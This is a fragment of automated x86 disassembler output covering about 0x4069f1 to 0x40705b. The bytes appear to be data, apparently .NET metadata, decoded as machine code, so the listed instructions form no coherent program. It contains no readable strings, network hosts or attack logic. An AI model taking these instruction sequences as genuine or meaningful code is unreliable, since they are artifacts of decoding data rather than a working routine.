  4069f1:	00 44 0c b1          	add    %al,-0x4f(%esp,%ecx,1)
  4069f5:	02 5c 00 8f          	add    -0x71(%eax,%eax,1),%bl
  4069f9:	25 00 00 00 00       	and    $0x0,%eax
  4069fe:	96                   	xchg   %eax,%esi
  4069ff:	00 44 0c b8          	add    %al,-0x48(%esp,%ecx,1)
  406a03:	02 5e 00             	add    0x0(%esi),%bl
  406a06:	44                   	inc    %esp
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 44 0c be          	add    %al,-0x42(%esp,%ecx,1)
  406a11:	02 5f 00             	add    0x0(%edi),%bl
  406a14:	78 20                	js     0x406a36
  406a16:	00 00                	add    %al,(%eax)
  406a18:	00 00                	add    %al,(%eax)
  406a1a:	86 18                	xchg   %bl,(%eax)
  406a1c:	05 15 0e 00 61       	add    $0x61000e15,%eax
  406a21:	00 9e 25 00 00 00    	add    %bl,0x25(%esi)
  406a27:	00 96 00 45 0f c5    	add    %dl,-0x3af0bb00(%esi)
  406a2d:	02 61 00             	add    0x0(%ecx),%ah
  406a30:	04 56                	add    $0x56,%al
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 5e 0c             	add    %bl,0xc(%esi)
  406a3a:	cb                   	lret
  406a3b:	02 62 00             	add    0x0(%edx),%ah
  406a3e:	cc                   	int3
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 3a                	add    %bh,(%edx)
  406a47:	1d d2 02 64 00       	sbb    $0x6402d2,%eax
  406a4c:	ab                   	stos   %eax,%es:(%edi)
  406a4d:	25 00 00 00 00       	and    $0x0,%eax
  406a52:	96                   	xchg   %eax,%esi
  406a53:	00 db                	add    %bl,%bl
  406a55:	18 da                	sbb    %bl,%dl
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 2d 06 e1 02 68    	add    %ch,0x6802e106
  406a67:	00 e6                	add    %ah,%dh
  406a69:	25 00 00 00 00       	and    $0x0,%eax
  406a6e:	96                   	xchg   %eax,%esi
  406a6f:	00 68 10             	add    %ch,0x10(%eax)
  406a72:	e8 02 6a 00 6c       	call   0x6c40d479
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 a1 00 ef 02 6c    	add    %ah,0x6c02ef00(%ecx)
  406a83:	00 9c 57 00 00 00 00 	add    %bl,0x0(%edi,%edx,2)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 a8 13 f6 02 6e    	add    %ch,0x6e02f613(%eax)
  406a91:	00 78 20             	add    %bh,0x20(%eax)
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	05 15 0e 00 70       	add    $0x70000e15,%eax
  406a9f:	00 e0                	add    %ah,%al
  406aa1:	58                   	pop    %eax
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 6b 18             	add    %ch,0x18(%ebx)
  406aaa:	84 01                	test   %al,(%ecx)
  406aac:	70 00                	jo     0x406aae
  406aae:	6c                   	insb   (%dx),%es:(%edi)
  406aaf:	59                   	pop    %ecx
  406ab0:	00 00                	add    %al,(%eax)
  406ab2:	00 00                	add    %al,(%eax)
  406ab4:	96                   	xchg   %eax,%esi
  406ab5:	00 62 18             	add    %ah,0x18(%edx)
  406ab8:	84 01                	test   %al,(%ecx)
  406aba:	71 00                	jno    0x406abc
  406abc:	00 00                	add    %al,(%eax)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	c9                   	leave
  406ac1:	0a 00                	or     (%eax),%al
  406ac3:	00 01                	add    %al,(%ecx)
  406ac5:	00 c9                	add    %cl,%cl
  406ac7:	0a 00                	or     (%eax),%al
  406ac9:	00 01                	add    %al,(%ecx)
  406acb:	00 c9                	add    %cl,%cl
  406acd:	0a 00                	or     (%eax),%al
  406acf:	00 01                	add    %al,(%ecx)
  406ad1:	00 c9                	add    %cl,%cl
  406ad3:	0a 00                	or     (%eax),%al
  406ad5:	00 01                	add    %al,(%ecx)
  406ad7:	00 c9                	add    %cl,%cl
  406ad9:	0a 00                	or     (%eax),%al
  406adb:	00 01                	add    %al,(%ecx)
  406add:	00 c9                	add    %cl,%cl
  406adf:	0a 00                	or     (%eax),%al
  406ae1:	00 01                	add    %al,(%ecx)
  406ae3:	00 c9                	add    %cl,%cl
  406ae5:	0a 00                	or     (%eax),%al
  406ae7:	00 01                	add    %al,(%ecx)
  406ae9:	00 c9                	add    %cl,%cl
  406aeb:	0a 00                	or     (%eax),%al
  406aed:	00 01                	add    %al,(%ecx)
  406aef:	00 c9                	add    %cl,%cl
  406af1:	0a 00                	or     (%eax),%al
  406af3:	00 01                	add    %al,(%ecx)
  406af5:	00 c9                	add    %cl,%cl
  406af7:	0a 00                	or     (%eax),%al
  406af9:	00 01                	add    %al,(%ecx)
  406afb:	00 aa 07 00 00 01    	add    %ch,0x1000007(%edx)
  406b01:	00 52 13             	add    %dl,0x13(%edx)
  406b04:	00 00                	add    %al,(%eax)
  406b06:	02 00                	add    (%eax),%al
  406b08:	af                   	scas   %es:(%edi),%eax
  406b09:	08 00                	or     %al,(%eax)
  406b0b:	00 03                	add    %al,(%ebx)
  406b0d:	00 b0 10 00 00 04    	add    %dh,0x4000010(%eax)
  406b13:	00 22                	add    %ah,(%edx)
  406b15:	18 00                	sbb    %al,(%eax)
  406b17:	00 01                	add    %al,(%ecx)
  406b19:	00 d2                	add    %dl,%dl
  406b1b:	12 00                	adc    (%eax),%al
  406b1d:	00 01                	add    %al,(%ecx)
  406b1f:	00 19                	add    %bl,(%ecx)
  406b21:	0d 00 00 01 00       	or     $0x10000,%eax
  406b26:	bf 0d 00 00 01       	mov    $0x100000d,%edi
  406b2b:	00 bf 0d 00 00 01    	add    %bh,0x100000d(%edi)
  406b31:	00 29                	add    %ch,(%ecx)
  406b33:	0d 00 00 01 00       	or     $0x10000,%eax
  406b38:	d4 18                	aam    $0x18
  406b3a:	00 00                	add    %al,(%eax)
  406b3c:	01 00                	add    %eax,(%eax)
  406b3e:	c7 04 00 00 02 00 fd 	movl   $0xfd000200,(%eax,%eax,1)
  406b45:	1b 00                	sbb    (%eax),%eax
  406b47:	00 03                	add    %al,(%ebx)
  406b49:	00 62 1b             	add    %ah,0x1b(%edx)
  406b4c:	00 00                	add    %al,(%eax)
  406b4e:	01 00                	add    %eax,(%eax)
  406b50:	32 07                	xor    (%edi),%al
  406b52:	00 00                	add    %al,(%eax)
  406b54:	01 00                	add    %eax,(%eax)
  406b56:	3d 18 00 00 02       	cmp    $0x2000018,%eax
  406b5b:	00 20                	add    %ah,(%eax)
  406b5d:	1b 00                	sbb    (%eax),%eax
  406b5f:	00 01                	add    %al,(%ecx)
  406b61:	00 fb                	add    %bh,%bl
  406b63:	16                   	push   %ss
  406b64:	00 00                	add    %al,(%eax)
  406b66:	01 00                	add    %eax,(%eax)
  406b68:	35 00 00 00 02       	xor    $0x2000000,%eax
  406b6d:	00 9b 00 00 00 03    	add    %bl,0x3000000(%ebx)
  406b73:	00 9e 00 00 00 01    	add    %bl,0x1000000(%esi)
  406b79:	00 52 13             	add    %dl,0x13(%edx)
  406b7c:	00 00                	add    %al,(%eax)
  406b7e:	02 00                	add    (%eax),%al
  406b80:	6b 0b 00             	imul   $0x0,(%ebx),%ecx
  406b83:	00 01                	add    %al,(%ecx)
  406b85:	00 aa 07 00 00 02    	add    %ch,0x2000007(%edx)
  406b8b:	00 c9                	add    %cl,%cl
  406b8d:	0a 00                	or     (%eax),%al
  406b8f:	00 01                	add    %al,(%ecx)
  406b91:	00 c9                	add    %cl,%cl
  406b93:	0a 00                	or     (%eax),%al
  406b95:	00 01                	add    %al,(%ecx)
  406b97:	00 aa 07 00 00 01    	add    %ch,0x1000007(%edx)
  406b9d:	00 b3 02 00 00 01    	add    %dh,0x1000002(%ebx)
  406ba3:	00 26                	add    %ah,(%esi)
  406ba5:	0e                   	push   %cs
  406ba6:	00 00                	add    %al,(%eax)
  406ba8:	01 00                	add    %eax,(%eax)
  406baa:	45                   	inc    %ebp
  406bab:	1c 00                	sbb    $0x0,%al
  406bad:	00 01                	add    %al,(%ecx)
  406baf:	00 e1                	add    %ah,%cl
  406bb1:	1c 00                	sbb    $0x0,%al
  406bb3:	00 01                	add    %al,(%ecx)
  406bb5:	00 b5 1b 00 00 01    	add    %dh,0x100001b(%ebp)
  406bbb:	00 b5 1b 00 00 01    	add    %dh,0x100001b(%ebp)
  406bc1:	00 b5 1b 00 00 01    	add    %dh,0x100001b(%ebp)
  406bc7:	00 b5 1b 00 00 01    	add    %dh,0x100001b(%ebp)
  406bcd:	00 32                	add    %dh,(%edx)
  406bcf:	00 00                	add    %al,(%eax)
  406bd1:	00 02                	add    %al,(%edx)
  406bd3:	00 87 00 00 00 01    	add    %al,0x1000000(%edi)
  406bd9:	00 b5 1b 00 00 01    	add    %dh,0x100001b(%ebp)
  406bdf:	00 b5 1b 00 00 01    	add    %dh,0x100001b(%ebp)
  406be5:	00 bf 18 00 00 01    	add    %bh,0x1000018(%edi)
  406beb:	00 4f 16             	add    %cl,0x16(%edi)
  406bee:	00 00                	add    %al,(%eax)
  406bf0:	01 00                	add    %eax,(%eax)
  406bf2:	cb                   	lret
  406bf3:	16                   	push   %ss
  406bf4:	00 00                	add    %al,(%eax)
  406bf6:	01 00                	add    %eax,(%eax)
  406bf8:	cb                   	lret
  406bf9:	16                   	push   %ss
  406bfa:	00 00                	add    %al,(%eax)
  406bfc:	01 00                	add    %eax,(%eax)
  406bfe:	02 1c 00             	add    (%eax,%eax,1),%bl
  406c01:	00 01                	add    %al,(%ecx)
  406c03:	00 02                	add    %al,(%edx)
  406c05:	1c 00                	sbb    $0x0,%al
  406c07:	00 01                	add    %al,(%ecx)
  406c09:	00 02                	add    %al,(%edx)
  406c0b:	1c 00                	sbb    $0x0,%al
  406c0d:	00 01                	add    %al,(%ecx)
  406c0f:	00 02                	add    %al,(%edx)
  406c11:	1c 00                	sbb    $0x0,%al
  406c13:	00 01                	add    %al,(%ecx)
  406c15:	00 02                	add    %al,(%edx)
  406c17:	1c 00                	sbb    $0x0,%al
  406c19:	00 01                	add    %al,(%ecx)
  406c1b:	00 bf 0d 00 00 01    	add    %bh,0x100000d(%edi)
  406c21:	00 ac 0d 00 00 02 00 	add    %ch,0x20000(%ebp,%ecx,1)
  406c28:	b7 0d                	mov    $0xd,%bh
  406c2a:	00 00                	add    %al,(%eax)
  406c2c:	01 00                	add    %eax,(%eax)
  406c2e:	c9                   	leave
  406c2f:	0a 00                	or     (%eax),%al
  406c31:	00 01                	add    %al,(%ecx)
  406c33:	00 c9                	add    %cl,%cl
  406c35:	0a 00                	or     (%eax),%al
  406c37:	00 01                	add    %al,(%ecx)
  406c39:	00 c9                	add    %cl,%cl
  406c3b:	0a 00                	or     (%eax),%al
  406c3d:	00 01                	add    %al,(%ecx)
  406c3f:	00 2b                	add    %ch,(%ebx)
  406c41:	1c 00                	sbb    $0x0,%al
  406c43:	00 01                	add    %al,(%ecx)
  406c45:	00 c9                	add    %cl,%cl
  406c47:	0a 00                	or     (%eax),%al
  406c49:	00 01                	add    %al,(%ecx)
  406c4b:	00 aa 07 00 00 01    	add    %ch,0x1000007(%edx)
  406c51:	00 aa 07 00 00 01    	add    %ch,0x1000007(%edx)
  406c57:	00 bc 17 00 00 01 00 	add    %bh,0x10000(%edi,%edx,1)
  406c5e:	bc 17 00 00 01       	mov    $0x1000017,%esp
  406c63:	00 c9                	add    %cl,%cl
  406c65:	0a 00                	or     (%eax),%al
  406c67:	00 01                	add    %al,(%ecx)
  406c69:	00 c9                	add    %cl,%cl
  406c6b:	0a 00                	or     (%eax),%al
  406c6d:	00 01                	add    %al,(%ecx)
  406c6f:	00 c9                	add    %cl,%cl
  406c71:	0a 00                	or     (%eax),%al
  406c73:	00 01                	add    %al,(%ecx)
  406c75:	00 f8                	add    %bh,%al
  406c77:	1c 00                	sbb    $0x0,%al
  406c79:	00 02                	add    %al,(%edx)
  406c7b:	00 c9                	add    %cl,%cl
  406c7d:	0a 00                	or     (%eax),%al
  406c7f:	00 01                	add    %al,(%ecx)
  406c81:	00 f8                	add    %bh,%al
  406c83:	1c 00                	sbb    $0x0,%al
  406c85:	00 02                	add    %al,(%edx)
  406c87:	00 c9                	add    %cl,%cl
  406c89:	0a 00                	or     (%eax),%al
  406c8b:	00 01                	add    %al,(%ecx)
  406c8d:	00 29                	add    %ch,(%ecx)
  406c8f:	07                   	pop    %es
  406c90:	00 00                	add    %al,(%eax)
  406c92:	01 00                	add    %eax,(%eax)
  406c94:	29 07                	sub    %eax,(%edi)
  406c96:	00 00                	add    %al,(%eax)
  406c98:	01 00                	add    %eax,(%eax)
  406c9a:	6b 0d 00 00 01 00 c9 	imul   $0xffffffc9,0x10000,%ecx
  406ca1:	0a 00                	or     (%eax),%al
  406ca3:	00 01                	add    %al,(%ecx)
  406ca5:	00 6c 0e 00          	add    %ch,0x0(%esi,%ecx,1)
  406ca9:	00 01                	add    %al,(%ecx)
  406cab:	00 71 0e             	add    %dh,0xe(%ecx)
  406cae:	00 00                	add    %al,(%eax)
  406cb0:	01 00                	add    %eax,(%eax)
  406cb2:	71 0e                	jno    0x406cc2
  406cb4:	00 00                	add    %al,(%eax)
  406cb6:	01 00                	add    %eax,(%eax)
  406cb8:	cb                   	lret
  406cb9:	16                   	push   %ss
  406cba:	00 00                	add    %al,(%eax)
  406cbc:	01 00                	add    %eax,(%eax)
  406cbe:	29 07                	sub    %eax,(%edi)
  406cc0:	00 00                	add    %al,(%eax)
  406cc2:	01 00                	add    %eax,(%eax)
  406cc4:	bc 17 00 00 01       	mov    $0x1000017,%esp
  406cc9:	00 bc 17 00 00 01 00 	add    %bh,0x10000(%edi,%edx,1)
  406cd0:	c9                   	leave
  406cd1:	0a 00                	or     (%eax),%al
  406cd3:	00 01                	add    %al,(%ecx)
  406cd5:	00 c9                	add    %cl,%cl
  406cd7:	0a 00                	or     (%eax),%al
  406cd9:	00 01                	add    %al,(%ecx)
  406cdb:	00 c9                	add    %cl,%cl
  406cdd:	0a 00                	or     (%eax),%al
  406cdf:	00 01                	add    %al,(%ecx)
  406ce1:	00 bc 17 00 00 02 00 	add    %bh,0x20000(%edi,%edx,1)
  406ce8:	94                   	xchg   %eax,%esp
  406ce9:	10 00                	adc    %al,(%eax)
  406ceb:	00 01                	add    %al,(%ecx)
  406ced:	00 bc 17 00 00 01 00 	add    %bh,0x10000(%edi,%edx,1)
  406cf4:	75 0b                	jne    0x406d01
  406cf6:	00 00                	add    %al,(%eax)
  406cf8:	02 00                	add    (%eax),%al
  406cfa:	bc 17 00 00 01       	mov    $0x1000017,%esp
  406cff:	00 bc 17 00 00 01 00 	add    %bh,0x10000(%edi,%edx,1)
  406d06:	bc 17 00 00 02       	mov    $0x2000017,%esp
  406d0b:	00 7b 0e             	add    %bh,0xe(%ebx)
  406d0e:	00 00                	add    %al,(%eax)
  406d10:	01 00                	add    %eax,(%eax)
  406d12:	bc 17 00 00 02       	mov    $0x2000017,%esp
  406d17:	00 c2                	add    %al,%dl
  406d19:	16                   	push   %ss
  406d1a:	00 00                	add    %al,(%eax)
  406d1c:	01 00                	add    %eax,(%eax)
  406d1e:	bc 17 00 00 02       	mov    $0x2000017,%esp
  406d23:	00 71 0e             	add    %dh,0xe(%ecx)
  406d26:	00 00                	add    %al,(%eax)
  406d28:	01 00                	add    %eax,(%eax)
  406d2a:	bc 17 00 00 02       	mov    $0x2000017,%esp
  406d2f:	00 71 0e             	add    %dh,0xe(%ecx)
  406d32:	00 00                	add    %al,(%eax)
  406d34:	01 00                	add    %eax,(%eax)
  406d36:	bc 17 00 00 02       	mov    $0x2000017,%esp
  406d3b:	00 6c 0e 00          	add    %ch,0x0(%esi,%ecx,1)
  406d3f:	00 01                	add    %al,(%ecx)
  406d41:	00 bc 17 00 00 02 00 	add    %bh,0x20000(%edi,%edx,1)
  406d48:	76 0e                	jbe    0x406d58
  406d4a:	00 00                	add    %al,(%eax)
  406d4c:	01 00                	add    %eax,(%eax)
  406d4e:	bc 17 00 00 02       	mov    $0x2000017,%esp
  406d53:	00 76 0e             	add    %dh,0xe(%esi)
  406d56:	00 00                	add    %al,(%eax)
  406d58:	01 00                	add    %eax,(%eax)
  406d5a:	b5 1b                	mov    $0x1b,%ch
  406d5c:	00 00                	add    %al,(%eax)
  406d5e:	01 00                	add    %eax,(%eax)
  406d60:	b5 1b                	mov    $0x1b,%ch
  406d62:	16                   	push   %ss
  406d63:	00 59 00             	add    %bl,0x0(%ecx)
  406d66:	18 00                	sbb    %al,(%eax)
  406d68:	5d                   	pop    %ebp
  406d69:	00 b1 00 ee 1a bb    	add    %dh,-0x44e51200(%ecx)
  406d6f:	01 b1 00 da 1b bf    	add    %esi,-0x40e42600(%ecx)
  406d75:	01 b1 00 c9 19 0e    	add    %esi,0xe19c900(%ecx)
  406d7b:	00 b9 00 ed 14 64    	add    %bh,0x6414ed00(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 05 15 01 03 d1    	add    %al,0xd1030115
  406d89:	00 05 15 0e 00 d9    	add    %al,0xd9000e15
  406d8f:	00 05 15 2e 03 e9    	add    %al,0xe9032e15
  406d95:	00 05 15 6b 01 f1    	add    %al,0xf1016b15
  406d9b:	00 05 15 6b 01 f9    	add    %al,0xf9016b15
  406da1:	00 05 15 6b 01 01    	add    %al,0x1016b15
  406da7:	01 05 15 6b 01 09    	add    %eax,0x9016b15
  406dad:	01 05 15 6b 01 11    	add    %eax,0x11016b15
  406db3:	01 05 15 6b 01 19    	add    %eax,0x19016b15
  406db9:	01 05 15 6b 01 21    	add    %eax,0x21016b15
  406dbf:	01 05 15 6b 01 29    	add    %eax,0x29016b15
  406dc5:	01 05 15 6b 01 31    	add    %eax,0x31016b15
  406dcb:	01 05 15 4b 02 39    	add    %eax,0x39024b15
  406dd1:	01 05 15 0e 00 41    	add    %eax,0x41000e15
  406dd7:	01 05 15 6b 01 49    	add    %eax,0x49016b15
  406ddd:	01 84 12 7f 00 51 01 	add    %eax,0x151007f(%edx,%edx,1)
  406de4:	6e                   	outsb  %ds:(%esi),(%dx)
  406de5:	00 c4                	add    %al,%ah
  406de7:	03 59 01             	add    0x1(%ecx),%ebx
  406dea:	f3 19 7f 00          	repz sbb %edi,0x0(%edi)
  406dee:	51                   	push   %ecx
  406def:	01 75 10             	add    %esi,0x10(%ebp)
  406df2:	84 00                	test   %al,(%eax)
  406df4:	09 00                	or     %eax,(%eax)
  406df6:	05 15 0e 00 61       	add    $0x61000e15,%eax
  406dfb:	01 37                	add    %esi,(%edi)
  406dfd:	01 cd                	add    %ecx,%ebp
  406dff:	03 51 01             	add    0x1(%ecx),%edx
  406e02:	24 0c                	and    $0xc,%al
  406e04:	2a 01                	sub    (%ecx),%al
  406e06:	61                   	popa
  406e07:	01 b3 0c d3 03 11    	add    %esi,0x1103d30c(%ebx)
  406e0d:	00 05 15 2b 02 11    	add    %al,0x11022b15
  406e13:	00 ca                	add    %cl,%dl
  406e15:	1c d9                	sbb    $0xd9,%al
  406e17:	03 69 01             	add    0x1(%ecx),%ebp
  406e1a:	95                   	xchg   %eax,%ebp
  406e1b:	1c df                	sbb    $0xdf,%al
  406e1d:	03 61 01             	add    0x1(%ecx),%esp
  406e20:	b9 16 e5 03 81       	mov    $0x8103e516,%ecx
  406e25:	01 e2                	add    %esp,%edx
  406e27:	01 c7                	add    %eax,%edi
  406e29:	00 79 01             	add    %bh,0x1(%ecx)
  406e2c:	3b 0d eb 03 19 00    	cmp    0x1903eb,%ecx
  406e32:	05 15 09 04 19       	add    $0x19040915,%eax
  406e37:	00 4b 0b             	add    %cl,0xb(%ebx)
  406e3a:	01 03                	add    %eax,(%ebx)
  406e3c:	19 00                	sbb    %eax,(%eax)
  406e3e:	38 0b                	cmp    %cl,(%ebx)
  406e40:	01 03                	add    %eax,(%ebx)
  406e42:	c1 01 6f             	roll   $0x6f,(%ecx)
  406e45:	1d 16 04 c1 01       	sbb    $0x1c10416,%eax
  406e4a:	e5 19                	in     $0x19,%eax
  406e4c:	1c 04                	sbb    $0x4,%al
  406e4e:	d1 01                	roll   $1,(%ecx)
  406e50:	05 15 0e 00 d1       	add    $0xd1000e15,%eax
  406e55:	01 de                	add    %ebx,%esi
  406e57:	1b 23                	sbb    (%ebx),%esp
  406e59:	04 d9                	add    $0xd9,%al
  406e5b:	01 f6                	add    %esi,%esi
  406e5d:	15 28 04 19 00       	adc    $0x190428,%eax
  406e62:	4c                   	dec    %esp
  406e63:	19 30                	sbb    %esi,(%eax)
  406e65:	04 19                	add    $0x19,%al
  406e67:	00 3c 03             	add    %bh,(%ebx,%eax,1)
  406e6a:	bf 01 19 00 4c       	mov    $0x4c001901,%edi
  406e6f:	19 3c 02             	sbb    %edi,(%edx,%eax,1)
  406e72:	99                   	cltd
  406e73:	01 05 15 0e 00 a1    	add    %eax,0xa1000e15
  406e79:	01 05 15 36 02 99    	add    %eax,0x99023615
  406e7f:	01 66 17             	add    %esp,0x17(%esi)
  406e82:	38 04 99             	cmp    %al,(%ecx,%ebx,4)
  406e85:	01 4f 0c             	add    %ecx,0xc(%edi)
  406e88:	70 01                	jo     0x406e8b
  406e8a:	c1 01 e5             	roll   $0xe5,(%ecx)
  406e8d:	19 3f                	sbb    %edi,(%edi)
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 de                	add    %ebx,%esi
  406e93:	1b 49 04             	sbb    0x4(%ecx),%ecx
  406e96:	f1                   	int1
  406e97:	01 6c 08 0e          	add    %ebp,0xe(%eax,%ecx,1)
  406e9b:	00 f9                	add    %bh,%cl
  406e9d:	01 05 15 4f 04 01    	add    %eax,0x1044f15
  406ea3:	02 05 15 56 04 21    	add    0x21045615,%al
  406ea9:	00 05 15 5c 04 19    	add    %al,0x19045c15
  406eaf:	00 32                	add    %dh,(%edx)
  406eb1:	1b 66 04             	sbb    0x4(%esi),%esp
  406eb4:	09 00                	or     %eax,(%eax)
  406eb6:	6a 0c                	push   $0xc
  406eb8:	47                   	inc    %edi
  406eb9:	02 21                	add    (%ecx),%ah
  406ebb:	00 6e 1a             	add    %ch,0x1a(%esi)
  406ebe:	6c                   	insb   (%dx),%es:(%edi)
  406ebf:	04 29                	add    $0x29,%al
  406ec1:	02 05 15 56 04 29    	add    0x29045615,%al
  406ec7:	00 05 15 78 04 31    	add    %al,0x31047815
  406ecd:	02 05 15 56 04 c1    	add    0xc1045615,%al
  406ed3:	00 0f                	add    %cl,(%edi)
  406ed5:	03 82 04 39 02 9c    	add    -0x63fdc6fc(%edx),%eax
  406edb:	07                   	pop    %es
  406edc:	8f 04 31             	pop    (%ecx,%esi,1)
  406edf:	00 76 17             	add    %dh,0x17(%esi)
  406ee2:	96                   	xchg   %eax,%esi
  406ee3:	04 c1                	add    $0xc1,%al
  406ee5:	00 6c 08 0e          	add    %ch,0xe(%eax,%ecx,1)
  406ee9:	00 19                	add    %bl,(%ecx)
  406eeb:	00 6c 08 0e          	add    %ch,0xe(%eax,%ecx,1)
  406eef:	00 29                	add    %ch,(%ecx)
  406ef1:	00 6c 08 0e          	add    %ch,0xe(%eax,%ecx,1)
  406ef5:	00 c1                	add    %al,%cl
  406ef7:	00 07                	add    %al,(%edi)
  406ef9:	03 a1 04 49 02 6e    	add    0x6e024904(%ecx),%esp
  406eff:	00 a7 04 c1 00 14    	add    %ah,0x1400c104(%edi)
  406f05:	03 ae 04 51 02 05    	add    0x5025104(%esi),%ebp
  406f0b:	15 56 04 49 01       	adc    $0x1490456,%eax
  406f10:	05 15 b6 04 49       	add    $0x4904b615,%eax
  406f15:	01 97 1b bd 04 61    	add    %edx,0x6104bd1b(%edi)
  406f1b:	02 86 14 cf 04 49    	add    0x4904cf14(%esi),%al
  406f21:	02 b9 16 9f 01 19    	add    0x19019f16(%ecx),%bh
  406f27:	00 40 0f             	add    %al,0xf(%eax)
  406f2a:	d6                   	salc
  406f2b:	04 c1                	add    $0xc1,%al
  406f2d:	00 ea                	add    %ch,%dl
  406f2f:	08 de                	or     %bl,%dh
  406f31:	04 59                	add    $0x59,%al
  406f33:	02 05 15 2b 02 c1    	add    0xc1022b15,%al
  406f39:	00 ac 11 15 02 c1 00 	add    %ch,0xc10215(%ecx,%edx,1)
  406f40:	46                   	inc    %esi
  406f41:	0d 0e 00 61 02       	or     $0x261000e,%eax
  406f46:	f3 19 9a 00 71 02 44 	repz sbb %ebx,0x44027100(%edx)
  406f4d:	19 0a                	sbb    %ecx,(%edx)
  406f4f:	00 59 01             	add    %bl,0x1(%ecx)
  406f52:	ce                   	into
  406f53:	15 c7 00 a1 02       	adc    $0x2a100c7,%eax
  406f58:	e4 07                	in     $0x7,%al
  406f5a:	01 05 79 02 05 15    	add    %eax,0x15050279
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 46 18             	add    0x18(%esi),%al
  406f66:	07                   	pop    %es
  406f67:	05 81 02 aa 06       	add    $0x6aa0281,%eax
  406f6c:	0d 05 a9 02 f3       	or     $0xf302a905,%eax
  406f71:	06                   	push   %es
  406f72:	47                   	inc    %edi
  406f73:	02 b1 02 5e 07 47    	add    0x47075e02(%ecx),%dh
  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 7b 1d             	add    %edi,0x1d(%ebx)
  406f7e:	16                   	push   %ss
  406f7f:	04 81                	add    $0x81,%al
  406f81:	02 e9                	add    %cl,%ch
  406f83:	15 13 05 81 02       	adc    $0x2810513,%eax
  406f88:	3b 0f                	cmp    (%edi),%ecx
  406f8a:	0e                   	push   %cs
  406f8b:	00 89 02 05 15 0e    	add    %cl,0xe150502(%ecx)
  406f91:	00 89 02 00 07 6b    	add    %cl,0x6b070002(%ecx)
  406f97:	01 b1 02 ea 06 47    	add    %esi,0x4706ea02(%ecx)
  406f9d:	02 a1 02 e8 10 c7    	add    -0x38ef17fe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 c1                	add    %eax,%ecx
  406fa7:	18 1a                	sbb    %bl,(%edx)
  406fa9:	05 89 02 89 18       	add    $0x18890289,%eax
  406fae:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb1:	02 c7                	add    %bh,%al
  406fb3:	06                   	push   %es
  406fb4:	20 05 89 02 18 1c    	and    %al,0x1c180289
  406fba:	4b                   	dec    %ebx
  406fbb:	02 81 02 97 1b 27    	add    0x271b9702(%ecx),%al
  406fc1:	05 c1 02 62 14       	add    $0x146202c1,%eax
  406fc6:	30 05 c9 02 7a 08    	xor    %al,0x87a02c9
  406fcc:	c7 00 91 02 bf 1c    	movl   $0x1cbf0291,(%eax)
  406fd2:	35 05 c1 01 c1       	xor    $0xc101c105,%eax
  406fd7:	18 3f                	sbb    %bh,(%edi)
  406fd9:	05 91 02 c0 0a       	add    $0xac00291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 aa 18       	add    $0x18aa02d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	da 08                	fimull (%eax)
  406fea:	3e 01 e1             	ds add %esp,%ecx
  406fed:	02 05 15 4c 05 d9    	add    0xd9054c15,%al
  406ff3:	02 6c 16 2a          	add    0x2a(%esi,%edx,1),%ch
  406ff7:	01 a1 02 0d 07 c3    	add    %esp,-0x3cf8f2fe(%ecx)
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 c1                	add    %eax,%ecx
  407001:	18 01                	sbb    %al,(%ecx)
  407003:	05 99 02 05 15       	add    $0x15050299,%eax
  407008:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  40700b:	02 da                	add    %dl,%bl
  40700d:	07                   	pop    %es
  40700e:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407011:	02 5f 0d             	add    0xd(%edi),%bl
  407014:	c3                   	ret
  407015:	00 a1 02 1d 07 c7    	add    %ah,-0x38f8e2fe(%ecx)
  40701b:	00 89 02 09 0d 4b    	add    %cl,0x4b0d0902(%ecx)
  407021:	02 89 02 79 0a 4b    	add    0x4b0a7902(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40702b:	1b 3e                	sbb    (%esi),%edi
  40702d:	01 59 01             	add    %ebx,0x1(%ecx)
  407030:	4f                   	dec    %edi
  407031:	1d c3 00 a1 02       	sbb    $0x2a100c3,%eax
  407036:	68 1b c7 00 f9       	push   $0xf900c71b
  40703b:	02 05 15 6b 01 f9    	add    0xf9016b15,%al
  407041:	02 0c 0b             	add    (%ebx,%ecx,1),%cl
  407044:	23 02                	and    (%edx),%eax
  407046:	01 03                	add    %eax,(%ebx)
  407048:	05 15 0e 00 01       	add    $0x1000e15,%eax
  40704d:	03 4f 07             	add    0x7(%edi),%ecx
  407050:	47                   	inc    %edi
  407051:	02 c1                	add    %cl,%al
  407053:	01 99 14 47 02 c1    	add    %ebx,-0x3efdb8ec(%ecx)
  407059:	01 c3                	add    %eax,%ebx
  40705b:	17                   	pop    %ss
